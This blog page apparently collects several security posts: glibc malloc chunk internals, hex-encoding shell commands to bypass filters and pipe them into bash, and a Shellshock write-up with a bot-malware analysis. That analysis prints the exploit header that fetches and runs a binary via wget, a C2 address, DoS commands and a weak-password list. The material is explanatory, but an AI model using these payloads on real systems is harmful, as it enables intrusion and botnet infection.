<p><img src="/images/2017-09-10/v2-d31eb1d32944769bdd5477f3d277d7fd_b.png" alt=""></p>
<p>图5-4 改进版的chunk格式之Knuth边界标记</p>
<p>显然每个chunk的脚部都在其相邻的下一个chunk的头部的前4个字节处。通过这个脚部，堆内存管理器就可以很容易地得到前一个chunk的起始位置和分配状态，进而加以合并了。</p>
<p>但是，边界标记同时带来了一个问题：它要求每个块都包含一个头部和脚部，如果应用程序频繁地进行小内存的申请和释放操作的话(比如1，2个字节)，就会造成很大的性能损耗。同时，考虑到只有在对free chunk进行合并的时候才需要脚部，也就是说对于allocated chunk而言它并不需要脚部，因此我们可以对这个脚部加以优化——将前一个chunk的已分配/空闲标记位存储在当前chunk的size字段的第1，或2比特位上，这样如果我们通过当前chunk的size字段知道了前一个chunk为free chunk，那么就可得出结论：当前chunk地址之前的4个字节为前一个free chunk的脚部，我们可以通过该脚部获取前一个chunk的起始位置；如果当前chunk的size字段的标记位表明前一个chunk是allocated chunk的话，那么就可得出另一个结论：前一个chunk没有脚部，即当前chunk地址之前的4个字节为前一个allocated chunk的payload或padding的最后部分。新的chunk格式图如下：</p>
<p><img src="/images/2017-09-10/v2-0eadd69a889223eafc585134de13d866_b.png" alt=""></p>
<p>图5-5 改进版的Knuth边界标记allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-83f58d72c5b960bd72603c4a94477744_b.png" alt=""></p>
<p>图5-6 改进版的Knuth边界标记free chunk格式</p>
<h5 id="2-再进化——支持多线程"><a href="#2-再进化——支持多线程" class="headerlink" title="2.再进化——支持多线程"></a>2.再进化——支持多线程</h5><p>随着技术的发展，特别是堆内存管理器添加对多线程的支持，前述的chunk格式已经难以满足需求，比如，我们需要标志位来标记当前chunk是否属于非主线程即thread arena，以及该chunk由mmap得来还是通过brk实现等等。但此时chunk size只剩下一个比特位未使用了，怎么办呢？这需要对chunk格式进行大手术！</p>
<p>首先思考：是否有必要同时保存当前chunk和<strong>前一个chunk的已分配/空闲标记位？答案是否定的，因为我们只需要保存前一个chunk的分配标志位就可以了，至于当前chunk的分配标志位，可以通过查询下一个chunk的size字段得到</strong>。那么size字段中剩下的两个比特位就可以用于满足多线程的标志需求了：</p>
<p><img src="/images/2017-09-10/v2-9a5a0e9737b5dcb4e14ec4d186d8ddf6_b.png" alt=""></p>
<p>图5-7 多线程版本Knuth边界标记allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-66621268cd9759bd19e6dc07a41eab9c_b.png" alt=""></p>
<p>图5-8 多线程版本Knuth边界标记free chunk格式</p>
<p>这里的P,M,N的含义如下：</p>
<blockquote>
<p>PREV_INUSE(P): 表示前一个chunk是否为allocated。</p>
<p>IS_MMAPPED(M)：表示当前chunk是否是通过mmap系统调用产生的。</p>
<p>NON_MAIN_ARENA(N)：表示当前chunk是否是thread arena。</p>
</blockquote>
<p>再进一步，发现没必要保存chunk size的副本，也就是说Footer的作用并不大，但是如果前一个chunk是free的话，在合并的时候我们又需要知道前一个chunk的大小，怎么办呢？将Footer从尾部移到首部，同时其不再保存当前chunk的size，而是前一个free chunk的size不就行了。同样的，为了提高内存利用率，如果前一个chunk是allocated chunk的话，这个Footer就作为allocated chunk的payload或padding的一部分，结构图如下：</p>
<p><img src="/images/2017-09-10/v2-42f98a954d6d13971d640b34bfe60b55_b.png" alt=""></p>
<p>图5-9 当前glibc malloc allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-9dcc9c637c66bae48402c9bb9d11d568_b.png" alt=""></p>
<p>图5-10 当前glibc malloc free chunk格式</p>
<p>至此，glibc malloc堆内存管理器中使用的隐式链表技术就介绍完毕了。现在我们再回过头去看malloc_chunk结构体就很好理解了：该结构体通过每个chunk的prev_size和size构成了隐式链表，而后续的fd, bk等指针并不是作用于隐式链表的，而是用于后文会介绍的用于加快内存分配和释放效率的显示链表bin(还记得bin么？用于记录同一类型free chunk的链表)，并且这些指针跟prev_size一样只在free chunk中存在。关于显示链表bin的原理比较复杂，让我们带着疑惑，暂时略过这部分信息，等介绍完所有chunk之后再加以详细介绍。</p>
<h4 id="5-2-Top-Chunk"><a href="#5-2-Top-Chunk" class="headerlink" title="5.2 Top Chunk"></a>5.2 Top Chunk</h4><p>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk。该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p>
<h4 id="5-3-Last-Remainder-Chunk"><a href="#5-3-Last-Remainder-Chunk" class="headerlink" title="5.3 Last Remainder Chunk"></a>5.3 Last Remainder Chunk</h4><p>要想理解此chunk就必须先理解glibc malloc中的bin机制。如果你已经看了第二部分文章，那么下面的原理就很好理解了，否则建议你先阅读第二部分文章。对于Last remainder chunk，我们主要有两个问题：1)它是怎么产生的；2)它的作用是什么？</p>
<p>先回答第一个问题。还记得第二部分文章中对small bin的malloc机制的介绍么？当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，<strong>再将该新的chunk变成新的last remainder chunk</strong>。</p>
<p>然后回答第二个问题。此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p>
<p><strong>作者：走位@阿里聚安全，更多安全技术文章，请点击</strong><a href="https://jaq.alibaba.com/community/index" target="_blank" rel="external"><strong>阿里聚安全博客 </strong></a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/10/获取shell的方法总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/10/获取shell的方法总结/" itemprop="url">获取shell的方法总结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-10T01:31:58+08:00">
                2017-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近做了一下pwnable.kr上面的题，对某些内容有了一定的感想，特别是获取shell这方面！</p>
<h4 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h4><blockquote>
<p> linux下的C++程序中：</p>
<p> system(&#39;set -s&#39;);  </p>
<p>其执行效果相当于获取一个shell</p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/09/shell下的进制转换/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/09/shell下的进制转换/" itemprop="url">shell下的进制转换</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-09T21:44:35+08:00">
                2017-09-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近一直在学filter绕过的姿势，所以急需shell下绕过的方法，其中关键的一环就是shell下的进制转换！</p>
<p>主要参考：</p>
<p><a href="https://stackoverflow.com/questions/1604765/linux-shell-scripting-hex-string-to-bytes" target="_blank" rel="external">https://stackoverflow.com/questions/1604765/linux-shell-scripting-hex-string-to-bytes</a></p>
<p><a href="https://stackoverflow.com/questions/6292645/convert-binary-data-to-hex-in-shell-script" target="_blank" rel="external">https://stackoverflow.com/questions/6292645/convert-binary-data-to-hex-in-shell-script</a></p>
<p>进制转换有多种工具，在linux上常见的有hexdump、od -x、xxd等</p>
<p>下面我们来简单介绍一下这些命令</p>
<h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><p>xxd比较常用，也比较好用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">Usage:</div><div class="line">       xxd [options] [infile [outfile]]</div><div class="line">    or</div><div class="line">       xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]]</div><div class="line">Options:</div><div class="line">    -a          toggle autoskip: A single '*' replaces nul-lines. Default off.</div><div class="line">    -b          binary digit dump (incompatible with -ps,-i,-r). Default hex.</div><div class="line">    -c cols     format &lt;cols&gt; octets per line. Default 16 (-i: 12, -ps: 30).</div><div class="line">    -E          show characters in EBCDIC. Default ASCII.</div><div class="line">    -e          little-endian dump (incompatible with -ps,-i,-r).</div><div class="line">    -g          number of octets per group in normal output. Default 2 (-e: 4).</div><div class="line">    -h          print this summary.</div><div class="line">    -i          output in C include file style.</div><div class="line">    -l len      stop after &lt;len&gt; octets.</div><div class="line">    -o off      add &lt;off&gt; to the displayed file position.</div><div class="line">    -ps         output in postscript plain hexdump style.</div><div class="line">    -r          reverse operation: convert (or patch) hexdump into binary.</div><div class="line">    -r -s off   revert with &lt;off&gt; added to file positions found in hexdump.</div><div class="line">    -s [+][-]seek  start at &lt;seek&gt; bytes abs. (or +: rel.) infile offset.</div><div class="line">    -u          use upper case hex letters.</div><div class="line">    -v          show version: "xxd V1.10 27oct98 by Juergen Weigert".</div><div class="line">    -p：以一个整块输出所有的hex， 不使用空格进行分割</div></pre></td></tr></table></figure>
<p>上面的是xxd的用法，下面我们来逐步介绍！</p>
<blockquote>
<p> 将0x313233解释成123</p>
<p> root@test:/# echo 0x313233| xxd -r<br> 123root@test:/#</p>
</blockquote>
<blockquote>
<p>将123解释成0x313233</p>
<p>root@test:/# echo 123|xxd -ps<br>3132330a</p>
</blockquote>
<font color="#f00">需要注意的是，我们不能直接使用xxd -r 0x313233，原因是xxd后面只能接文件！而echo 123，并用管道连接，其实就是创建了一个临时文件交给xxd来处理</font>

<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>​    每行有限定字符个数，xxd -ps限定每行最多有60个16进制数</p>
<p>​    而xxd -r则至多转换16个字符</p>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "export FF=\"/tmp/flag\";cat \$FF;echo vunerable"|xxd -p</div><div class="line">6578706f72742046463d222f746d702f666c6167223b636174202446463b</div><div class="line">6563686f2076756e657261626c650a</div><div class="line">root@test:/# echo "export FF=\"/tmp/flag\";cat \$FF;echo vunerable"|xxd -p|tr -d '\n'</div><div class="line">6578706f72742046463d222f746d702f666c6167223b636174202446463b6563686f2076756e657261626c650aroot@test:/#</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "export FF=\"/tmp/flag\""|xxd -p</div><div class="line">6578706f72742046463d222f746d702f666c6167220a</div><div class="line">root@test:/# echo 0x6578706f72742046463d222f746d702f666c616722|xxd -rp</div><div class="line">export FF="/tmp/root@test:/# echo 0x6578706f72742046463d222f746d702f666c616722|xxd -r -p</div><div class="line">export FF="/tmp/flag"root@test:/#</div></pre></td></tr></table></figure>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
<li>对于字符串转16进制中每行60个16进制的限制，可以使用echo 123|xxd -p|tr -d &#39;\n&#39;</li>
</ul>
<ul>
<li>对于16进制转字符串中至多转换16个字符的限制，可以使用xxd -r -p中的r和p一定得分开</li>
</ul>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "flag is here" &gt; /tmp/flag</div><div class="line">root@test:/# echo "\"export FF='/tmp/flag';cat \$FF\""|xxd -p|tr -d '\n'</div><div class="line">226578706f72742046463d272f746d702f666c6167273b63617420244646220aroot@test:/# </div><div class="line">root@test:/# echo 0x226578706f72742046463d272f746d702f666c6167273b6361742024464622|xxd -r -p|xargs bash -c</div><div class="line">flag is here</div></pre></td></tr></table></figure>
<p>上面的应用综合利用了所学的知识，其中前两步是铺垫，最后一步才是真正的poc。需要注意的是bash -c 一定接字符串，而且该字符串需要用双引号括起来！</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@test:/# echo "flag is here" &gt; /tmp/flag</div><div class="line">root@test:/# echo "export FF='/tmp/flag';cat \$FF"|xxd -p|tr -d '\n'</div><div class="line">6578706f72742046463d272f746d702f666c6167273b636174202446460aroot@test:/# </div><div class="line">root@test:/# echo 0x6578706f72742046463d272f746d702f666c6167273b63617420244646|xxd -r -p|bash -i</div><div class="line">root@test:/# export FF='/tmp/flag';cat $FF</div><div class="line">flag is here</div><div class="line">root@test:/# exit</div></pre></td></tr></table></figure>
<p>上面同样是十分完美的应用，主要特点是使用了bash -i，这相当于一个交互式的应用，管道线前面输出的内容会在这个交互中完成，完成后立刻退出！注意，管道线前面输出的内容不能用双引号括起来！</p>
<h3 id="perl的妙用"><a href="#perl的妙用" class="headerlink" title="perl的妙用"></a>perl的妙用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat found | sed &apos;s/.*: &quot;//g;s/ .*//;s/^0*//&apos; | xargs python -c &apos;import sys; print &quot;&quot;.join([bin(int(x)).lstrip(&quot;0b&quot;) for x in sys.argv[1:]])&apos; | perl -lpe &apos;$_=pack(&quot;B*&quot;,$_)&apos;</div><div class="line">最后的代码意思是前面管道输入的01字符串打包成8字节的字符串</div><div class="line"></div><div class="line">将A\B两种不同代码替换，并输出成字符串</div><div class="line">echo ABBBAAAABBBBBABBABBBABBB | perl -pe &apos;BEGIN &#123; binmode \*STDOUT &#125; chomp; tr/AB/\0\1/; $_ = pack &quot;B*&quot;, $_&apos;</div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/09/shellshock原理介绍/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/09/shellshock原理介绍/" itemprop="url">shellshock原理介绍</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-09T13:18:47+08:00">
                2017-09-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="一-漏洞事件介绍"><a href="#一-漏洞事件介绍" class="headerlink" title="一.漏洞事件介绍"></a><strong>一.漏洞事件介绍</strong></h2><h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a><strong>1.漏洞信息</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">●发布时间:2014-09-25　14时48分04秒</div><div class="line">●CVE ID:CVE-2014-6271</div><div class="line">●受影响版本:</div></pre></td></tr></table></figure>
<p><a href="http://image.3001.net/images/20140929/14119555774668.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119555774668.png%21small" alt="受ShellShock影响的版本"></a></p>
<h3 id="2-漏洞概述"><a href="#2-漏洞概述" class="headerlink" title="2.漏洞概述"></a><strong>2.漏洞概述</strong></h3><p><strong>Bash(GNU Bourne-Again Shell)</strong>是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中，以实现windows的POSIX虚拟接口.</p>
<p>Bash其广泛的使用将意味全球至少 150 万的主机将受到影响，此外 Linux/Unix 世界内的安卓和苹果都难以幸免。</p>
<p><a href="http://www.freebuf.com/news/44805.html" target="_blank" rel="external">破壳漏洞（ShellShock）</a>的严重性被定义为 10 级（最高）,而今年 4 月爆发的 OpenSSL(心脏出血)漏洞才 5 级！</p>
<h3 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3.漏洞成因:"></a><strong>3.漏洞成因:</strong></h3><p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统</p>
<p>受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令</p>
<h3 id="4-漏洞测试"><a href="#4-漏洞测试" class="headerlink" title="4.漏洞测试:"></a><strong>4.漏洞测试:</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(1).CVE-2014-6271 测试方式:</div><div class="line">      env x='() &#123; :;&#125;; exp' bash -c "echo this is a test" </div><div class="line">(2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)</div><div class="line">      env -i X=';() &#123; (a)=&gt;\' bash -c 'echo date'; cat echo</div></pre></td></tr></table></figure>
<h3 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a><strong>5.修复方案</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">请广大站长及时关注官网的安全补丁更新</div><div class="line">(1).针对RedHat、CentOS Liunx发行版本，请执行：</div><div class="line">    yum -y update bash</div><div class="line">(2).针对Debian Liunx发行版本，请执行：</div><div class="line">    sudo apt-get update &amp;&amp; sudo apt-get install --only-upgrade bash</div></pre></td></tr></table></figure>
<h2 id="二-样本概述"><a href="#二-样本概述" class="headerlink" title="二.样本概述"></a><strong>二.样本概述</strong></h2><h3 id="●样本来源"><a href="#●样本来源" class="headerlink" title="●样本来源:"></a><strong>●样本来源:</strong></h3><p>由于2014年9月24日法国某Linux爱好者公布了BASH漏洞(CVE-2014-6721),时至今日网络上已有利用该漏洞的病毒样本,我们于今日捕获到该漏洞样本,并进行了紧急分析</p>
<h3 id="●文件信息"><a href="#●文件信息" class="headerlink" title="●文件信息:"></a><strong>●文件信息:</strong></h3><p>文件名:nginx</p>
<p>文件大小:525KB</p>
<p>MD5:5924bcc045bb7039f55c6ce29234e29a  </p>
<p><a href="http://image.3001.net/images/20140929/14119556446899.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119556446899.png%21small" alt="Bash 样本文件信息"></a></p>
<h3 id="●行为概述"><a href="#●行为概述" class="headerlink" title="●行为概述:"></a><strong>●行为概述:</strong></h3><p>该漏洞样本利用Bash漏洞进行传播扩散,并使用Linux Shell命令wget下载该样本并执行,该样本执行后首先会收集系统相关的信息(CPU,网络配置等信息),紧接着样本连接到自己的服务器,通过接受服务器发送的指令,来远程控制被感染机器,进而组建僵尸网络,进行洪水攻击,以及入侵中国某厂商,而入侵之后主要是为了莱特币的挖取</p>
<h2 id="三-样本详细分析"><a href="#三-样本详细分析" class="headerlink" title="三.样本详细分析"></a><strong>三.样本详细分析</strong></h2><h3 id="1-样本传播方式"><a href="#1-样本传播方式" class="headerlink" title="1.样本传播方式"></a><strong>1.样本传播方式</strong></h3><p>该样本利用Bash漏洞进行传播,其漏洞的利用只需要简单的几行命令即可,这无疑为利用者带来了极大的便利,利用代码如下:</p>
<p><a href="http://image.3001.net/images/20140929/14119557242937.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557242937.png%21small" alt="Bash样本利用代码"></a></p>
<p>而该样本通过wget将样本下载并执行,利用漏洞命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Cookie, ().&#123;.:;.&#125;;.wget /tmp/besh http://X.X.X.X/nginx; chmod.777 /tmp/besh; /tmp/besh;</div></pre></td></tr></table></figure>
<h3 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a><strong>2.样本行为分析</strong></h3><p><strong>(1).获取计算机相关信息</strong></p>
<p>该样本启动后首先会获取计算机的相关信息,如CPU,网络配置等信息</p>
<p><a href="http://image.3001.net/images/20140929/14119557383644.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557383644.png%21small" alt="Bash样本获取计算机信息"></a></p>
<p><strong>(2).接着该样本连接自己的服务器(89.238.150.154:5)</strong></p>
<p>strace附加在创建的子进程样本上监视其行为如下:</p>
<p><a href="http://image.3001.net/images/20140929/14119557523092.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557523092.png%21small" alt="Bash样本连接自己的服务器"></a></p>
<p>但是C&amp;C的server已经挂掉了</p>
<p><strong>(3).如果连接服务器成功,则根据服务器传来的指令,远程控制被感染机器,命令集合如下:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PING </div><div class="line">GETLOCALIP </div><div class="line">SCANNER </div><div class="line">HOLD (DoS Flood) </div><div class="line">JUNK (DoS Flood) </div><div class="line">UDP (DoS Flood) </div><div class="line">TCP (DoS Flood) </div><div class="line">KILLATTK </div><div class="line">LOLNOGTFO</div></pre></td></tr></table></figure>
<p><strong>●PING命令:</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119557641898.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557641898.png%21small" alt="Bash样本服务器的PING命令"></a></p>
<p>类似于心跳包,测试客户端服务器是否连接成功</p>
<p><strong>●GETLOCALIP</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119557764384.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557764384.png%21small" alt="发送本机IP地址到目标服务器"></a></p>
<p>发送本机IP地址到目标服务器</p>
<p><strong>●SCANNER</strong></p>
<p>其主要是通过Busybox来对字符进行解析,从而设定扫描攻击目标,然后通过DVR scanner来对目标DVR设备进行扫描,看是否存在DVR漏洞,进而发起攻击</p>
<p><a href="http://image.3001.net/images/20140929/14119557914517.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119557914517.png%21small" alt="Bash样本SCANNER"></a></p>
<p>我们通过busybox来对该字符串进行解析得到</p>
<p><a href="http://image.3001.net/images/20140929/14119558016271.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558016271.png%21small" alt="字符串剖析结果"></a></p>
<p>然而在样本中,我们发现:</p>
<p><a href="http://image.3001.net/images/20140929/14119558124398.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558124398.png%21small" alt="Bash样本中DVR Scanner"></a></p>
<p>DVR Scanner主要测试目标是否存在DVR漏洞,如果存在则尝试通过像”root”,”12345”这样的弱口令进行进行连接,如果连接成功,则执行ps尝试寻找”cmd.so”进程,该进程主要是莱特币矿工相关.</p>
<p>于是可以高度怀疑通过此方法来挖取莱特币</p>
<p>程序中存在的弱口令表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root </div><div class="line">admin </div><div class="line">user </div><div class="line">login </div><div class="line">guest </div><div class="line">toor </div><div class="line">changeme </div><div class="line">1234 </div><div class="line">12345 </div><div class="line">123456 </div><div class="line">default </div><div class="line">pass </div><div class="line">password</div></pre></td></tr></table></figure>
<p><strong>●HOLD (Dos Flood)</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558398157.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558398157.png%21small" alt="对目标服务器进行Hold洪水攻击"></a></p>
<p>对目标服务器进行Hold洪水攻击,通过接受服务器数据包,来指明需要攻击的秒数,并将攻击时间返回给服务器</p>
<p><strong>●JUNK (DoS Flood) </strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558506793.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558506793.png%21small" alt="对目标服务器进行JUNK洪水攻击"></a></p>
<p>对目标服务器进行JUNK洪水攻击</p>
<p><strong>●UDP (DoS Flood)</strong> </p>
<p><a href="http://image.3001.net/images/20140929/14119558625359.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558625359.png%21small" alt="对目标服务器进行UDP洪水攻击"></a></p>
<p>对目标服务器进行UDP洪水攻击</p>
<p><strong>●TCP (DoS Flood) </strong></p>
